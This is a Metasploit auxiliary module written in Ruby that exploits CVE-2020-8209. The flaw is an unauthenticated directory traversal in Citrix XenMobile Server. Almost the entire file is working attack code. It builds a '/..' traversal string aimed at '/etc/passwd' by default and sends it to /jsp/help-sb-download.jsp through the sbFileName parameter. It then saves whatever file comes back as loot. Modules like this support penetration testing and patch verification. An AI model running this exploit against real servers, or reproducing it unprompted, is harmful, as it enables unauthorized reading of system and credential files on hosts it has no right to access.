##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Path Traversal in Citrix XenMobile Server',
      'Description' => %q{
        This module exploits an unauthenticated directory traversal vulnerability
        in Citrix XenMobile Server 10.12 before RP2, Citrix XenMobile Server 10.11 before RP4,
        Citrix XenMobile Server 10.10 before RP6 and Citrix XenMobile Server before 10.9 RP5
        which leads to the ability to read arbitrary files.
      },
      'References'  =>
        [
          ['CVE', '2020-8209'],
          ['URL', 'https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/']
        ],
      'Author'      =>
        [
          'Andrey Medov', # Vulnerability discovery
          'Dhiraj Mishra' # Metasploit module
        ],
      'DisclosureDate' => '2020-08-11',
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(8443),
        OptString.new('FILEPATH', [true, "The path to the file to read", '/etc/passwd']),
        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 4 ])
      ])
  end

  def run_host(ip)
    filename = datastore['FILEPATH']
    traversal = "/.." * datastore['DEPTH'] << filename

    res = send_request_raw({
      'method' => 'GET',
      'uri'    => '/jsp/help-sb-download.jsp',
      'vars_get' => {
        'sbFileName' => traversal
      }
    })

    unless res && res.code == 200
      print_error('Nothing was downloaded')
      return
    end

    vprint_good("#{peer} - #{res.body}")
    path = store_loot(
      'xenmobile.traversal',
      'text/plain',
      ip,
      res.body,
      filename
    )
    print_good("File saved in: #{path}")
  end
end
